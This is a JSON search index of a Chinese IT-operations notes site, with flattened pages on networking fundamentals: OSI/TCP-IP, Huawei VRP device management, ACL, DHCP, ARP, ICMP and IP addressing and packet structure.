{"./":{"url":"./","title":"首页","keywords":"","body":"写在开头 本站会不定期分享一些关于IT运维相关的文章，由于受时间、技术水平和能力的限制，可能存在表述不准确的地方，仅供一起讨论学习。 推荐阅读 https://www.feiyunote.cn/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/AWD/AWD-Guide.html 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-08 16:48 "},"1.网络技术/1.网络概述/1.网络企业基础架构.html":{"url":"1.网络技术/1.网络概述/1.网络企业基础架构.html","title":"1.网络企业基础架构","keywords":"","body":" 网络：似宇宙洪荒，浩瀚无边，深不可测；网络案例似璀璨群星，千变万化，闪耀环宇。学习网络技术似夜观星象，每有所得，便拍案惊奇，夜不能寐。 路由交换类似于“路”，只有把路建好了，才能去别人家。 主要设备：交换机、路由器、防火墙 上网通常使用的是私网地址，并不能直接访问Internet，可以通过NAT技术 企业架构分层： 核心层：对用户流量进行高速处理转发 汇聚层：对用户的流量进行汇聚 接入层：用于接入用户，供用户访问服务 企业网络架构很大程度取决于企业或机构的业务需求： 小型企业 通常只有一个办公地点，一般采用扁平网络架构（没有层次化）进行组网。扁平网络架构能够满足用户对资源的基本访问需求，具有较强的灵活性，同时又能够大大减少部署和维护成本。网络通常缺少冗余机制，可靠性不高，容易发生业务中断。 大型企业 业务对网络的连续性要求很高，所以通常会通过冗余备份来保证网络的可用性和稳定性，从而保证企业的日常业务运营。网络也会对业务资源的访问进行控制，所以通常采用多层网络架构来优化流量分布，并应用各种策略进行流量管理和资源访问控制。多层网络设计也可以使网络易于扩展。网络采用模块化设计能够有效实现网络隔离并网络维护，避免某一区域产生的故障影响到整个网络。 运营商网络： 覆盖范围大（全省，全国……） 网络复杂 多厂商共存（华为、思科、华三……） 网络安全可靠性要求高（不能出现断网、被攻击……） 涉及的网络制式多（涉及多种协议） IDC数据中心 校园网 五大网：中国移动、中国电信、中国联通、教育网、科研网 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.网络技术/1.网络概述/2.网络概述.html":{"url":"1.网络技术/1.网络概述/2.网络概述.html","title":"2.网络概述","keywords":"","body":"网络概述： 硬件方面：通过介质（网线、无线……）将网络设备和终端设备连接起来 软件方面：操作系统、应用软件、应用程序互相通信 实现资源共享、信息传递 网络的组成： 术语 备注 设备 Device 介质 Media 消息/报文 Massage/Data 协议 Protocol 发送方/信息源 Sender/Source 接受发/信息目 Receiver/Destination 数据通信是双向的（保证数据的来回） 网络的演进： 小型主机互联形成了局域网LAN 多个局域网互联就成了internet 互联网 全球相连就形成了Internet 因特网 术语 备注 network 网络，一组互连、通信的设备 internet 互联网，多个互联互通的网络 Internet 因特网，互联全世界的网络 Internet组成： ISP：Internet service providers 因特网服务提供商，向用户提供互联网接入业务、信息业务、和增值业务，俗称运营商，如：电信、移动、联通 用户通过Internet互联 Internet通过ISP构建 用途 WAN服务 ISP 最后一公里接入（宽带接入） 光纤、LAN、ADSL 电信、移动、联通 移动通信 WinMAX、3G/4G/5G、公共无线LAN 电信、移动、联通 VPN 广域以太网、IP-VPN、以太网VPN 电信、移动、联通 专线 ATM、专线 电信、移动、联通 网络的类型：根据覆盖范围不同，组网技术不同（二层） 类型 备注 PAN （个人蓝牙、热点） Personal area network，个人网 LAN（多台主机构建） Local area network，局域网 CAN（大的局域网构建） Campus area network，园区网 MAN（一个城市构建） Metropolitan area network，城域网 WAN（城市与城市构建） Wide area network，广域网 WLAN（WiFi） Wireless local area network，无线局域网 WWAN（3G/4G） Wireless wide area network，无线广域网 协议：Protocol 网络通信中的“语言” 汉语和英文当作“协议” 聊天当作“通信” 说话的内容当作“数据” 决定数据的格式和传输的一组规则 What ？How ？When ？ 协议一致，通信轻松 网络性能指标： 带宽（bandwidth） 描述在单位时间内从一个节点到另一个节点的数据量 类似于水管的粗细、公路的宽度 以bps（bit per second 比特每秒）为单位 如：以太网贷款为10Mbps，快速以太网为100Mbps 延迟（delay） 描述在单位时间内从一个节点到另一个节点的时间 以ms为单位 网络拓扑：topology ，用来描绘网络结构（网络类型、设备类型、设备数量、线缆、带宽、服务、数据走向等）示意图 制作拓扑图的软件：PPT，visio，亿图，模拟器 拓扑类型：根据接口、线缆、封装判断 星型 特点：边缘设备故障不影响其他设备通信 缺点：核心设备故障影响所有设备通信 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.网络技术/1.网络概述/3.网络模型.html":{"url":"1.网络技术/1.网络概述/3.网络模型.html","title":"3.网络模型","keywords":"","body":"分层思想：将复杂的流程分解为几个功能相对单一的子过程 流程更加清晰，复杂问题简单化 更容易发现问题并针对性的解决问题 如：小黑喝牛奶不在乎中间的过程 用户不在乎中间的过程只在乎上网 制作牛奶的部门：就是为了方便管理，出现问题能够找到问题源 对于网络也需要分层：方便管理，出现问题能够找到问题源易于学习，各层之间的改变不影响其他层 网络标准化：规范不同的互联标准，互相兼容，加快网络发展 1974年前-各厂商都有自己的通信协议标准，导致不同厂商之间不兼容，影响互联网发展 1974年-提出OSI开放式互联参考模型协议，但是未被认可，TCP/IP协议认可 2000年至今通信都在使用遵守TCP/IP协议 OSI开放式互联参考模型： OSI未被广泛认可原因：层次太多麻烦复杂、功能重复 网络排错思想： 从下层到上层开始 从上层到下层开始 TCP/IP开发早于OSI，最终在市场获取认可，目前所使用的通信标准 数据封装和解封装： 应用数据需要经过逐层处理后才能通过网络传递给对方 OSI把每一层数据称为PDU（protocol data unit 协议数据单元） TCP/IP根据不同层分别使用段segment、包packet、帧frame、比特bit 发送者逐层向下传递数据，并添加报头和报尾的过程称为封装（打包） 反之，接收者逐层向上传递数据，称为解封装（拆包） TCP/IP协议簇中的常见协议： 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.网络技术/1.网络概述/4.OSI参考模型.html":{"url":"1.网络技术/1.网络概述/4.OSI参考模型.html","title":"4.OSI参考模型","keywords":"","body":"OSI参考模型的背景： 互联网早期并没有一个通信标准，导致各厂商之间使用自己的私有技术来实现通信，从而影响了网络的发展 国际标准化组织（International Organization for Standardization，ISO）在1984年正式提出OSI开放互联参考模型，定义了通信的基础标准，如今使用最广泛的TCP/IP协议就是基于OSI模型设计的（并不是具体的一种协议、应用，只是一种参考模型） OSI的分层结构：物理层、数据链路层、网络层、传输层、会话层、表示层、应用层 分层：模块化、标准化、流程化设计理念 带来的好处：减少复杂性、加速技术之间的兼容性、易于学习 每一个层次都是独立的， （如：工作在物理层的网卡的收发速率的改变，上层不需要变化） 但每一层都紧密相连 。 （如：工作在物理层的网卡出现故障，会导致上层都会收到影响 ） 各层的作用： 物理层：实现最基本的底层数据传输（传输方式、传输标准） 数据链路层：定义数据的基本格式（数据如何在线缆上传输，如何标识该数据，如何防止数据错误） 网络层：IP编址和路由功能（定义三层编址，提供在不同网络中转发的能力） 传输层：定义了端到端通信 （端到端连接、端到端之间传输数据、传输数据的速度、可靠性） 会话层：控制一个应用程序/一对IP地址（一对不同的会话，QQ、微信……） 表示层：定义数据的格式（定义数据的内容是图片JPG、视频AVI、文本TXT，压缩加密） 应用层：定义了应用协议（HTTP、SNMP） 数据传输封装和解封装： 封装：由上层到下层的逐级封装 数据由应用层产生，逐渐的往下走，每经过一个层都封装报头“穿马甲“ 解封装：由下层到上层的逐级解封装 每经过一层都会将报头解封装“卸马甲”，最终以原始的数据交付应用层 每层的数据报头的名词： TCP/IP协议： 根据OSI参考模型进行简化 TCP/IP与OSI模型的对比关系：（三层和四层比较重要保留） 每一层对应的协议： 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.网络技术/2.VRP基础/1.概述.html":{"url":"1.网络技术/2.VRP基础/1.概述.html","title":"1.概述","keywords":"","body":" VRP：version route platform 通用路由平台 华为公司具有完全自主知识产权的网络操作系统 可用运行多中硬件平台之上(路由器、交换机、防火墙) 拥有一致的网络界面、用户界面和管理界面，提供丰富的应用解决方案 集成了路由交换技术、QOS技术、安全技术和IP语言技术等数据通信功能 主要使用版本：VRPv5 高级版本v8 设备管理方式： 管理方式 登入方式 优点 缺点 应用场景 CLI命令行 console 使用console线缆连接 完全本地管理 单会话 无法远程 初始化 故障恢复 升级 CLI命令行 miniUSB 使用miniUSB线缆连接 完全本地管理 单会话 无法远程 初始化 故障恢复 升级 CLI命令行 Telnet 远程管理 多会话 明文传输 不安全 对安全性要求不高的网络 CLI命令行 SSH 远程管理 多会话 高安全性 配置较复杂 对安全性要求高的网络 管理方式 登入方式 优点 相同点 不同点 web图形化 HTTP 图形化界面，更直观 加载SSL证书用于登入认证，配置几乎相同 登入使用HTTPS，传输数据使用HTTP web图形化 HTTPS 图形化界面，更直观 加载SSL证书用于登入认证，配置几乎相同 登入和传输数据都是用HTTPS，需要开启命令 管理形式 备注 本地管理 local 通过console连接console口或miniUSB口，终端使用serial协议适合初始化，故障恢复系统升级 远程管理remote 通过IP地址或域名连接虚拟接口VTY口，使用Telnet或SSH适合后期维护、异地管理，同时支持多个会话 console线 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.网络技术/2.VRP基础/2.基础命令.html":{"url":"1.网络技术/2.VRP基础/2.基础命令.html","title":"2.基础命令","keywords":"","body":"VRP基本配置： 询问是否进入自动配置（一问一答模式）： VRP有很多中模式/视图，每个视图都有可执行的配置 常用的快捷键： 配置时间日期： 配置登入设备信息： 配置登入用户： 查看接口状态（二层或三层） 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.网络技术/2.VRP基础/3.文件系统.html":{"url":"1.网络技术/2.VRP基础/3.文件系统.html","title":"3.文件系统","keywords":"","body":" 设备内存 SDRAM 内存 （临时性存储） 断电后配置文件丢弃 （内存较大） Flash 闪存 （永久性存储） NVRAM 内存 断电后配置文件还在 （内存小） SD card SD卡 （永久性存储） USB （移动存储） 配置命令： pwd 显示当前所在的存储介质 dir 显示存储介质内的目录的文件 Mkdir 创建文件 More 显示记事本格式文件 CD /CD .. 进入目录 ，回到上一目录 Delete 将文件删除到回收站 Undelete 恢复删除的文件 Reset recycle-bin 清空回收站 rename重命名 Move 移动文件 Copy 复制文件 配置文件管理 显示当前配置文件 （断电丢失） 显示已保存的配置文件 保存当前配置文件 一个问题是问是否保存当前文件 第二个问题是问是否重启 格式化文件 格式化存储盘 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.网络技术/2.VRP基础/4.远程管理.html":{"url":"1.网络技术/2.VRP基础/4.远程管理.html","title":"4.远程管理","keywords":"","body":" 运行终端用户远程到任何可用充当Telnet服务器的设备 Telnet 服务器无需与终端用户直连，只要TCP可达 认证模式： 配置命令： Telnet server enable 开启telnet服务 Display telnet server 验证telnet服务 user-interface 0 4 set authentication-mode password/aaa user privilege level 15 user-interface maximum-vty 15 idle-timeout 10 进入VTY配置模式配置认证模式配置用户权限配置最大接入数配置超时时间 AAAlocal-user huawei password cipher huawei@123local-user huawei privilege level 15local-user huawei service-type telnet 进入AAA配置模式创建用户名和密码配置用户权限配置服务类型 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.网络技术/2.VRP基础/5.系统管理.html":{"url":"1.网络技术/2.VRP基础/5.系统管理.html","title":"5.系统管理","keywords":"","body":" VRP命名规则： 由VRP自身版本号和关联产品版本号两部分组成 产品版本格式包含设备型号 Vxxx （产品码），Rxxx（大版本号），Cxx（小版本号） 如果VRP产品版本有补丁，VRP产品版本中还包含SPC部分 文件传输协议 FTP可靠（在跨网段或广域网之间使用较好），TFTP不可靠 （在局域网内对可靠性要求不高使用较好） FTP传输的命令： TFTP传输的命令： Ftp 服务器地址Get 文件名 Tftp 服务器地址 get 文件名 FTP与TFTP的区别： 设备登入FTP需要输入账号密码，TFTP不需用 FTP传输会显示进度，TFTP不显示进度 FTP可用查看文件，TFTP不能查看 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.网络技术/3.TCPIP协议/1.TCP与UDP.html":{"url":"1.网络技术/3.TCPIP协议/1.TCP与UDP.html","title":"1.TCP与UDP","keywords":"","body":" 传输层提供端到端的连接（会话之间） 网络层提供点到点的连接（节点之间） 根据端口号可以区分不同的应用协议 传输层端口：Port 0~1023 属于公认端口/知名端口（给一些重要的协议使用的端口） 1024~49151属于注册端口/登记端口（应用注册使用的端口） 49152~65535属于私有端口/动态端口（主机/客户端使用的端口） 端口是根据需求自行更改的 可以通过更改端口可以让非信任用户访问不到应用 如FTP的端口默认为21，修改端口为9999，让非信任用户访问不到FTP服务器 客户端（source port 49152~65535） 服务器（source port 0~49152） 端口对应了一种应用协议，真正提供服务的是服务器 传输层协议： 协议 备注 TCP Transmission control protocol 传输控制协议可靠的、面向连接的协议传输效率低，类似于打电话 UDP User datagram protocol 用户数据报协议不可靠、无连接的服务传输效率高，类似于群聊 TCP在通信前需要建立关系来确认之间状态 UDP在通信前不需要建立关系来确认之间的状态 TCP与UDP数据包结构对比： TCP可靠，效率低 TCP会话的建立-三次握手：涉及标志位SYN,ACK 三次握手机制类似打电话：（确保身份状态的可靠性） 第一次握手： 第二次握手： 第三次握手： TCP会话的确认：对每个数据包都会进行确认（影响资源的消耗，推出滑动窗口机制，只对部分进行确认） TCP会话的拥塞和流量控制 根据窗口机制来控制网络拥塞（网络拥塞，主机接收服务器的数据不过来，服务器接收主机的请求不过来，可以根据窗口大小来调整） TCP会话的结束-四次握手：涉及ACK、FIN TCP的三次握手一定是三次交互报文，四次握手可能不会有四次交互报文（主机直接拔电） 网络中最霸道的攻击 DDos 黑客控制僵尸网络向服务器发送TCP SYN ，并不会对服务器的回应。 UDP：用户数据报协议 TCP与UDP的区别： 传输控制协议TCP 用户数据报协议UDP 面向连接 无连接 可靠传输 尽力而为的传输 支持流控及窗口机制 无流控及窗口机制 仅支持点对点通信 支持任意通信方式（点对点，点对多点） 多用于注重数据的完整性 不要求数据的完整性，开销小 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:19 "},"1.网络技术/3.TCPIP协议/2.数据链路层.html":{"url":"1.网络技术/3.TCPIP协议/2.数据链路层.html","title":"2.数据链路层","keywords":"","body":"以太网：Ethernet 当今主导地位的局域网组网技术（只与物理层数据链路层有关） 以太网的发展史： 20世纪70年代，由Xerox公司联合Intel和DEC公司开发出以太网 1973年，传输速率3Mb/s 1980年，传输速率10Mb/s 1990年，出现双绞线介质的以太网 1992年，传输速率100Mb/s 1998年，传输速率1000Mb/s 2010年，IEEE发布40G/100G标准 2013年，400G的以太网标准工作正式启动！ 以太网的分类： 类型 支持速率/模式 需不需要冲突检测CSMA/CD技术 DIX以太网 10Mbit/S以太网 需要CSMA/CD IEEE802.3 10Mbit/S以太网 需要CSMA/CD IEEE802.3u 100Mbit/S以太网 可以选择使用CSMA/CD IEEE802.3z 1Gbit/S以太网 可以选择使用CSMA/CD IEEE802.3ae 10Gbit/S以太网 不需要CSMA/CD IEEE802.3ba 40/100Gbit/S以太网 不需要CSMA/CD IEEE802.3x 全双工 不需要CSMA/CD CSMA/CD载波侦听多路访问/冲突检测技术：用来避免在同一共享介质出现信号冲突的技术。 工作流程：发前先听，变发边听，冲突停发，计算后重发 数据链路层的分层设计： 在数据链路层定义了两个子层：LLC层和MAC层 LLC Logical link control 逻辑链路控制负责识别网络层的协议类型并对网络层的数据进行封装向下层传递 MAC Media access config 介质访问控制负责控制物理层设备处理硬件设备的物理寻址、定义网络拓扑及数据帧的传递顺序 以太网的帧结构： IEEE802.3是Ethernet的前生，目前基本未使用 Ethernet帧结构： 协议类型 代表上层的协议 （IP=00800 ARP=00806 IPv6=86DD ） 帧大小范围 64B~1518B MTU 最大传输单元，每次发送数据的最大值（默认为1500B，大于或小于该值的数据帧都有问题） 帧校验 通过一定的计算公式来对数据包的完整性检查 MAC地址 代表一个网络接口的物理地址，全球唯一 FCS帧校验序列 4B：用来检测数据的完整性，不完整的会被之间丢弃（不会重传，靠上层实现重传） 前24位是IEEE电气和电子工程师协会分配给厂商，后24位是厂商分配的用户 主机接收到数据帧的动作： 检测FCS，通过下一步（反则丢弃） 检测DMAC，通过交给上层（反则丢弃） 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:19 "},"1.网络技术/3.TCPIP协议/3.应用层概述.html":{"url":"1.网络技术/3.TCPIP协议/3.应用层概述.html","title":"3.应用层概述","keywords":"","body":"应用层概述： TCP/IP模型的最高层 直接为应用程序提供网络服务 ​ 常用的应用层协议： DNS HTTP SMTP和POP3/IMAP Telnet和SSH FTP和TFTP DNS：Domain Name system 域名解析系统 （域名为了方便人们记忆） 建立IP地址与域名关系 将域名解析为IP地址 将IP地址解析为域名 每一次访问域名，都会向DNS服务器查询，DNS服务器进行响应，完成目的地址的封装 DNS大致分为请求报文request和响应报文relay 好用的DNS服务器：114.114.114.114 系统自带的DNS查询工具 命令 备注 nslookup 进行DNS查询 ipconfig /displayDNS 查看DNS缓存 ipconfig/flushDNS 清空DNS缓存 HTTP：hypertext transfer protocol 超文本传输协议 帮助客户端访问万维网 （World Wide Web） 网络浏览器通过翻译源代码（HTML超文本标识语言）文件来表示文本、图像、音乐、动作及视频 客户端首先发送get报文给服务器，请求将源代码发送 服务器将页面文件翻译文本、图像、音乐、动作及视频给客户端 HTTP不安全，抓包可以抓取到账号密码 SMTP和POP3：邮件服务 协议 备注 SMTP Simple mail transfer protocol 简单邮件传输协议用于发送邮件 POP3 Post office protocol v3 邮局协议版本3用于接收邮件 IMAP Internet massage access protocol 互联网邮件访问协议类似于POP3，功能更多 邮件绑定不成功，可能是邮件服务未开启 Telnet：terminal network 终端网络 远程管理的主要协议（网络设备、服务器、数据库等） 常用终端工具有：SecureCRT、Putty、Xshell Telnet 不安全，在抓包可以看到账号密码，现在多数使用SSH FTP和TFTP： 协议 备注 FTP File transfer protocol 文件传输协议提供可靠的文件传输服务具有认证、权限等功能 TFTP Trivial file transfer protocol 简单文件传输协议提供不可靠的文件传输服务消耗资源较小，速度较快常用于网络设备的配置文件和系统文件传输 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:22 "},"1.网络技术/4.路由/ACL.html":{"url":"1.网络技术/4.路由/ACL.html","title":"ACL","keywords":"","body":" ACL：Access Control List 访问控制列表 （第一代防火墙） ACL工作原理：先细后粗 ACL由一条或多条规则组成 每条规则必须选择动作：允许permit或拒绝deny 每条规则都有一个id序列号（编号默认为5，间隔默认为5） 序列号越小越先进行匹配（规则序列号小的先匹配上后面的规则就不再进行匹配） 只要有一条规则和报文匹配，就停止查找，称为命中规则 查找完所有规则，如果没有符合条件的规则，称为未命中规则 ACL只是一个流量匹配规则，必须要应用在某个接口或其他技术内才会激活 应用在接口时必须选择方向：入站或出站 不能过滤由设备自己产生的流量 ACL类型：分为数字型ACL和命名ACL 数字式ACL：下列序号是比较熟悉的，对于高级的设备支持匹配的序号越多 分类 编号范围 匹配参数 基本ACLBasic access-list 2000~2999 源IP地址等 高级ACLAdvance access-list 3000~3999 源IP地址、目标IP地址、源端口、目标端口等 二层ACLSpecify a L2 acl group 4000~4999 源MAC地址、目标MAC地址、以太帧协议类型等 用户自定义ACLUser defined access-list 5000~5999 ipv4包头、ipv6包头、L2层包头、L4层包头等 命名式ACL：如果后面有名字默认就是高级ACL，如果名字后有数字那就根据数字编号来确定 例： acl name noweb（高级ACL，从3999开始倒叙编号） acl name nochat 2266（基本ACL） 正掩码、反掩码、通配符区别： 名称 规则 作用 举例 备注 正掩码 连续的1和0 IP地址 255.255.255.0 1对应网络位，0对应主机位 反掩码 连续的1和0 路由协议OSPF等 0.0.0.255 0必须匹配，1无须匹配 通配符 任意的1和0 ACL 0.0.255.0 0必须匹配，1无须匹配 举例 备注 192.168.0.1 0.0.0.0/0 匹配一个主机地址 192.168.0.0 0.0.0.255 匹配一个网段 192.168.0.1 0.0.0.254 匹配网段内奇数地址 192.168.0.0 0.0.0.254 匹配网段内偶数地址 x.x.x.x 255.255.255.255 匹配所有地址 ACL配置： 命令 配置 acl 2000 创建一个基本ACL rule 5 permit source 192.168.1.0 0.0.0.255rule 5 deny source 192.168.1.0 0.0.0.255 配置ACL的规则：允许或拒绝源地址为192.168.1.0/24网段内的所有流量 acl 3000 创建一个高级ACL rule 5permit/deny tcp source 192.168.1.0 0.0.0.255 destination 8.8.8.8 0 destination-port eq 80 eq 等于 gt 大于 lt 小于 range 范围 配置ACL的规则：允许或拒绝源地址为192.168.1.0/24网段内到8.8.8.8的http流量 traffic-filter inbound acl 2000traffic-filter outbound acl 2000 在接口上调用ACL过滤流量 display acl 2000 验证ACL2000 display traffic-filter applied-record 查看设备上所有基于ACL调用情况 ACL调用方向建议：基本在出接口，高级在内接口 基本ACL尽量调用在离目标最近的出站接口Outbound 高级ACL尽量调用在离源头最近的入站接口Inbound ACL的规则一般是先细后粗 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:00 "},"1.网络技术/4.路由/ARP.html":{"url":"1.网络技术/4.路由/ARP.html","title":"ARP","keywords":"","body":"ARP address resolution protocol 地址解析协议 目的MAC不能不存在，负责完成不了封装，于是出现ARP ARP报文的类型分为request请求和reply/respond回应 ARP请求： ARP请求发送的类型为广播帧 （同一广播域的主机都会收到） ARP响应： ARP响应的类型为单播帧 （可以使用软件修改为广播-ARP欺骗） ARP缓存表：获取到的MAC地址会存放在该表 命令 备注 Arp -a 查看ARP缓存 Arp -d 清空ARP缓存 ARP欺骗：攻击者发送“无故ARP响应”来伪装其他设备 免费arp：用来检测配置/修改的IP地址是否重复 连续发送3次来检测地址有没有冲突 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:00 "},"1.网络技术/4.路由/DHCP.html":{"url":"1.网络技术/4.路由/DHCP.html","title":"DHCP","keywords":"","body":" DHCP：Dynamic Host Configure Protocol 动态主机配置协议 从BOOTP（Bootstrap Protocol）协议发展而来 UDP封装，服务器使用端口67，客户端使用端口68 动态分配网络信息（IP地址、子网掩码、网关、DNS服务器等） 分配给客户端的网络信息是有租约的 DHCP系统组成： DHCP Cilent客户端 请求网络信息的用户 DHCP Server服务器 能够提供DHCP功能的设备 DHCP Relay中继 一般为路由器或三层交换机等设备 DHCP报文结构： 报文类型 备注 DHCP Discover 发现 客户端寻找DHCP服务器 DHCP Offer 提供 服务器响应DHCP Discover报文，该报文携带了各种配置信息 DHCP Request 请求 客户端请求服务器对网络信息确认或者续约租期 DHCP ACK 确认 服务器对DHCP Request报文确认响应 DHCP NAK 不确认 服务器对DHCP Request报文的拒接响应 DHCP Release 释放 客户端要释放地址时用来通知服务器 DHCP工作流程： 注：Office报文和ACK报文也可以是广播包，因为服务器只是根据Mac地址回应，根本没有看三层 （在ACK确认之后才是真正的使用地址） NAK报文出现： 1.IP地址可能已经被使用 2.租期未到网络信息还存在，换了DHCP服务器 （回家，请求续约，但是服务器根本不存在该网络信息） DHCP租期更新： 在租期时间过50%后，主机会自动发送DHCP Request报文请求DHCP服务器重新续租 DHCP重绑定： 在租期时间过50%一直请求服务器，但服务器未响应，客户端在87.5%会以广播的形式发送DHCP Request报文请求以获取IP地址。 （注：是以广播的形式发送） 无法获取到DHCP服务器分配的网络信息，Windows客户端会自动使用169.254.0.0/16地址，供临时通信 无法获取从DHCP服务器获取网络信息的排错： 1.检测物理链路，驱动….. 2.Windows的DHCP client服务未开启 3.手动配置地址，测试于DHCP服务器的连通性 租期设置建议： 释放DHCP服务器分配的网络信息： DHCP地址池（pool）：所分配地址的集合 地址池的分类：接口地址池和全局地址池 同时配置，接口地址池优先级比全局地址池高 DHCP配置： 命令 备注 dhcp enable 开启DHCP功能 interface G0/0/0 进入具体接口开始配置 dhcp selcet interface 创建DHCP接口模式地址池 dhcp server dns-list 114.114.114.114 223.5.5.5 配置接口地址池的DNS服务器地址（可以配置多个） dhcp server lease day 1 hour 12 配置接口地址池的租期，默认1天 dhcp server excluded-ip-address 192.168.10.100 配置接口地址池排除的地址 dhcp server static-bind-ip-address 192.168.10.100 mac-address xxxx.xxxx.xxxx 配置静态绑定 dhcp select globa 创建DHCP全局模式地址池 ip pool RoomA 创建全局地址池名称 network 192.168.10.0 mask 24 配置全局地址池可分配的网段地址 gateway-list 192.168.10.1 配置全局地址池的网关地址 dns-list 114.114.114.114 223.5.5.5 配置全局地址池的网关地址 lease day 1 hour 12 配置全局地址池下的租期，默认1天 excluded-ip-addess 192.168.10.111 配置全局地址池下的排除地址范围 dhcp select relay 关联接口开启中继代理 dhcp relay server-ip192.168.10.254 指定DHCP服务器的地址 display ip pool interface vlanif10 used 验证某接口地址池的信息 display ip pool name huawei used 验证全局地址池的信息 display ip pool [interface 接口名 all] 查看地址池的属性 ipconfig /release 释放租期 ipconfig /renew 重新获取 DHCP接口地址池配置： DHCP全局地址池配置： 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.网络技术/4.路由/ICMP.html":{"url":"1.网络技术/4.路由/ICMP.html","title":"ICMP","keywords":"","body":" ICMP：Internet control massage protocol 因特网控制协议：用于测试网络可达性、使用ping、tracert等命令调用 ICMP的格式： ICMP的类型： echo request 回响请求 echo reply 回响应答 Type 类型和 Code 代码的组合： 命令 备注 Ping 测试网络连通性 tracert 显示经过的路径 Ping 参数： tracert参数： Ping 常见问题： 成功 对方成功回响 超时 对方主机不在线、屏蔽 （不在线-有对方MAC地址缓存，对方可能关机，平并-对方开启了策略“如防火墙”） 传输失败 物理链路/网卡问题，网关未指定 无法访问 未获取到MAC地址，导致无法进行ICMP封装 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.网络技术/4.路由/IP地址概述.html":{"url":"1.网络技术/4.路由/IP地址概述.html","title":"IP地址概述","keywords":"","body":"IP地址：IP Address 在网络中，通信节点都需要有一个IP地址 以点分十进制表示，有32位二进制构成（大小约43亿） 分为两大部分：网络位和主机位 网络位，代表IP地址所属的网段 主机位，代表网点上的某个节点 由子网掩码决定 “分界点” 熟记： IP地址分类：IP地址分为A,B,C,D,E五类地址 能够被主机使用的地址：A,B,C “单播地址” 只能用作目的的地址：D “组播地址” A类：0~126 B类：128~191 C类：192~223 D类：224~239 E类：240~255 特殊用途的地址： 0.0.0.0 任意地址 用于配置默认路由 127.0.0.0 环回地址 用于测试本地的TCP/IP协议栈是否正常 169.254.0.0 微软分配的地址 用于在DHCP地址获取失败后使用的地址 255.255.255.255 广播地址 用于本网络所有节点 在IP地址中定义了两种地址：公网地址和私网地址 公有地址：用于Internet，向ISP付费申请的地址，全球唯一 私网地址：仅用于企业网络内部，不能用于Internet，免费使用，可以重复 公网地址直接访问Internet，私网地址不能直接访问Internet。 私网地址访问Internet，需要NAT地址转换协议，将私网地址转换成公网地址 私网地址 范围 10.0.0.0/8 10.0.0.0~10.255.255.255 172.16.0.0/16 172.16.255.255~172.31.255.255 192.168.0.0/24 192.168.0.0~192.168.255.255 子网掩码：subnet mask 用于区分网络地址和主机地址 1表示网络位，0表示主机位（连续） 地址的默认子网掩码： A类 /8 255.0.0.0 B类/16 255.255.0.0 C类 /24 255.255.255.0 每个网段上都有两个特殊地址（最大和最小）是不能够使用的：网络地址和广播地址 网络地址和广播地址： 网络地址、主机地址、广播地址： 网络地址 主机位全0代表一个网段（头） 主机地址 主机位不能全0或1代表网段内的一个节点 广播地址 主机位全1代表一个网段内的所有节点（尾） 可用主机地址：掐头去尾 （减去网络和广播） A,B,C类地址默认掩码 有类IP地址规划的缺陷：使用默认掩码的问题：地址范围过大或过小，导致IP地址的浪费 子网划分： 满足不同网络对IP地址的需求 实现网络的层次化 节省IP地址 默认子网掩码可以进一步划分，称为可边长子网掩码“VLSM” 向主机位借1位，可以划分出两个网络 公式： 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.网络技术/4.路由/IP报文.html":{"url":"1.网络技术/4.路由/IP报文.html","title":"IP报文","keywords":"","body":" IP：Internet protocol 因特网协议：网络层占主导地址协议：IP IP报文结构： 版本version：标明IP报文的版本（ v4 或 v6） 头部长度header length：头部长度（最小为20B，最大为60B） 总长度total length：头部长度和数据长度 分片：当数据包的大小超过数据链路层的MTU就需要分成多份数据包传输 分片之后重组依靠： 标志 identification 标识符 flags 片偏移 fragment offset 标志：用来标识同一个数据包 标识符： 保留 ：未使用 分段：置位表示不能分片 （遇到超过MTU的直接丢弃） 更多分段：置位标识还有分片（未置位表示这是最后一个分片） 片偏移：说明该数据包在重组后的位置 TTL：time to live 生存时间 （生命值） 防止数据包在网络中无休止的传递（防环） 每经过一次路由（路由转发）TTL值就会减1 当TTL值=0，丢弃数据包，并告诉源地址 利用TTL特性，可以实现路由跟踪技术，排错的重要方法之一 